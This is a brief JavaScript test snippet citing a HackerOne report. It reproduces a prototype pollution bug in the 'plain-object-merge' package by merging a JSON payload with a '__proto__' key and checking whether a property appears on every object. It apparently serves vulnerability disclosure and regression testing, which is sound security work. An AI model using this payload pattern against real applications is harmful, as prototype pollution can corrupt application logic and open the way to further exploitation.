// //https://hackerone.com/reports/871156
// test("prototype pollution in plain-object-merge", () => {
  const merge = require("plain-object-merge");
  const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');

  obj = {};

console.log({}.polluted);

  merge([{}, payload]);
console.log({}.polluted);
// });
